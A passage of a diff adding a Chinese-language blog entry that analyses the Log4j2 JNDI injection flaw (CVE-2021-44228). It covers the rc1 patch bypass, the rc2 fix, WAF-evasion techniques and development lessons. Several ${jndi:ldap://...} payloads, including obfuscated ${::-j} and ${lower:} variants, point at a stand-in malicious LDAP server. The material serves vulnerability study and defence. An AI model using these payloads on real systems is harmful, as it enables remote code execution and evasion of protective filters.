+<li>如果未产生<code>URISyntaxException</code>，则执行<code>this.context.lookup(name)</code>。</li>
+</ul>
+<p>重点关注<code>catch</code>代码块，rc1默认不对<code>URISyntaxException</code>异常做任何处理，继续执行后续逻辑，即<code>this.context.lookup(name)</code>。</p>
+<p>再看下<code>try</code>代码块中可能产生<code>URISyntaxException</code>的地方。好巧不巧，<code>try</code>代码块的第一个语句就可能产生该异常：<code>URI uri = new URI(name);</code>。</p>
+<p>试想一下，如果能构造某个特殊的URI，导致<code>URI uri = new URI(name);</code>语句解析URI异常，抛出<code>URISyntaxException</code>，但又能被<code>this.context.lookup(name)</code>正确处理，不就可以绕过了吗？例如构建一个带空格的URI地址（<code>${jndi:ldap://127.0.0.1:1389/ Exp}</code>，由于撰写本文时无法构建rc1代码，故可参考<a href="https://www.freebuf.com/vuls/316143.html%EF%BC%89">https://www.freebuf.com/vuls/316143.html）</a></p>
+<h4 id="2-rc2的修复方案"><a href="#2-rc2的修复方案" class="headerlink" title="2. rc2的修复方案"></a>2. rc2的修复方案</h4><p>通过比较2.15.0-rc1和2.15.0-rc2之间的差异，可以发现Log4j2团队在12月10日提交了一个名为<code>Handle URI exception</code>的commit。该commit的详细内容如下链接：</p>
+<p><a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p>
+<p>该commit主要内容是对rc1中<code>JndiManager.lookup()</code>方法里的<code>catch</code>代码块进行了修改：当<code>URISyntaxException</code>异常被捕获时，直接返回<code>null</code>。从而避免了上面提到的绕过思路。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019211658860.png"></p>
+<h2 id="四、WAF绕过"><a href="#四、WAF绕过" class="headerlink" title="四、WAF绕过"></a>四、WAF绕过</h2><p>各大厂商针对log4j2漏洞应急方案集合：<a href="https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g">https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g</a></p>
+<p>由于Log4j2框架几乎是一个类似JDK级别的基础类库，即便自身应用程序里完成了升级，但大量存在依赖引入的其它框架、中间件导致升级工作极为困难，甚至在几年内都无法达到一个可接受的水平。目前，绝大部分公司采取在边界防护设备上使用“临时补丁”的方式。同时，大量bypass方法也随之而来，这将是一个漫长的过程。</p>
+<p>WAF主要思路是过滤jndi、ldap、rmi等关键字；过滤<code>ip:port</code></p>
+<p>原始payload</p>
+<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://malicious-ldap-server.com/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="（一）绕过思路1"><a href="#（一）绕过思路1" class="headerlink" title="（一）绕过思路1"></a>（一）绕过思路1</h3><p>前面分析提到过，StrSubstitutor首先会匹配<code>${</code>，然后还会匹配<code>:-</code></p>
+<p>以<code>${${::-j}ndi:${::-l}dap://127.0.0.1:1389/Exp}</code>为例</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020203630144.png" style="zoom:80%;">
+
+<p>如果找到<code>:-</code>，就截取<code>:-</code>之前的变量赋值给varName，截取<code>:-</code>到末尾的字符串赋值为varDefaultValve，然后就跳出循环。</p>
+<p>然后使用resolveVariable() 对varName的内容进行判断，如果不匹配任何log4j2支持的协议，就返回null（这里varName的值为<code>:</code>）。之后就会把varDefaultValve的值（这里为<code>j</code>）赋给varValue。然后再用varValue替换整个<code>${::-j}</code>，即最后结果为<code>jndi:ldap://127.0.0.1:1389/Exp</code>。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020203728230.png"></p>
+<p>所以绕过的方法可以是：</p>
+<pre class="line-numbers language-none"><code class="language-none">${任意字符串:-实际想要的字符串} = 实际想要的字符串<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>注意：</strong>这里的任意字符串不能为log4j2支持的Interpolator前缀。</p>
+<h3 id="（二）绕过思路2"><a href="#（二）绕过思路2" class="headerlink" title="（二）绕过思路2"></a>（二）绕过思路2</h3><p>Interpolator除jndi外，还支持解析很多其它前缀，如<code>env</code>、<code>lower</code>、<code>upper</code>，所以可以用如下思路来处理关键字（部分版本不支持<code>lower</code>、<code>upper</code>等协议）：</p>
+<pre class="line-numbers language-none"><code class="language-none">${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1:1389/Exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="（三）绕过思路3"><a href="#（三）绕过思路3" class="headerlink" title="（三）绕过思路3"></a>（三）绕过思路3</h3><p>针对过滤<code>ip:port</code>，可用域名代替或用默认端口开启ldap服务</p>
+<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://malicious-ldap-server.com/Exp}
+${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="五、思考"><a href="#五、思考" class="headerlink" title="五、思考"></a>五、思考</h2><p>Log4j2漏洞就其自身原理来说，并不复杂，本质上就是jndi注入，分析过程也主要聚焦于jndi注入的产生过程。rc1中采用较为严格的白名单策略，从应急处理的角度看无可厚非。但从历史上发生的各类漏洞修补过程来看，必定会有各种地方遗漏导致后续不断地打补丁。对于WAF的绕过，纵观古今漏洞，往往能在漏洞产生路线的周围找到绕过思路，就像高速公路一样，总会有“事故多发路段”。从软件开发角度讲，与其在上线后不停修复打补丁，不如在开发早期，即设计阶段或者开发阶段，尽量避免这类有可能产生安全风险的设计。在2.16.0版本，Log4j2团队干脆默认禁用掉了JNDI Lookup功能。</p>
+<p>另外，rc1中<code>catch</code>代码对异常的处理方式，在日常开发过程中也是容易犯的问题。软件开发中有一个安全原则：<code>Fail Securely</code>，意思是业务系统能够正确安全地处理各种异常和错误。虽然业务开发有时会为了便利性而牺牲一部分安全性，但对于Log4j此类偏底层的强依赖性类库，还是需要严格处理各种可能出现的错误和异常。</p>
+<p>阿里云工程师发现Apache Log4j2组件漏洞后，按业界惯例向软件开发方Apache开源社区报告这一问题。但最终工信部网络安全管理局决定暂停阿里云作为上述合作单位6个月。对此，笔者想引用艾公的一句话作为结尾：尊严只在剑锋之上，真理只在大炮射程之内。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>记录一次log4j复现之旅（复现不了你来找我）：<a href="https://blog.csdn.net/lmboss/article/details/123927020">https://blog.csdn.net/lmboss/article/details/123927020</a></p>
+<p>Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考：<a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
+<p>Apache Log4j2 Jndi RCE 高危漏洞分析与防御：<a href="https://paper.seebug.org/1787/">https://paper.seebug.org/1787/</a></p>
+<p><a href="https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">Log4j2 利用链与Waf绕过分析</a></p>
+<p>Apache log4j2 远程命令执行漏洞复现：<a href="https://cloud.tencent.com/developer/article/2148989">https://cloud.tencent.com/developer/article/2148989</a></p>
+<p>log4j waf 绕过技巧：<a href="https://www.cnblogs.com/ph4nt0mer/p/15701647.html">https://www.cnblogs.com/ph4nt0mer/p/15701647.html</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>细读经典</category>
+      </categories>
+      <tags>
+        <tag>细读经典</tag>
+        <tag>Log4j2</tag>
+        <tag>JNDI注入</tag>
+      </tags>
+  </entry>
 </search>
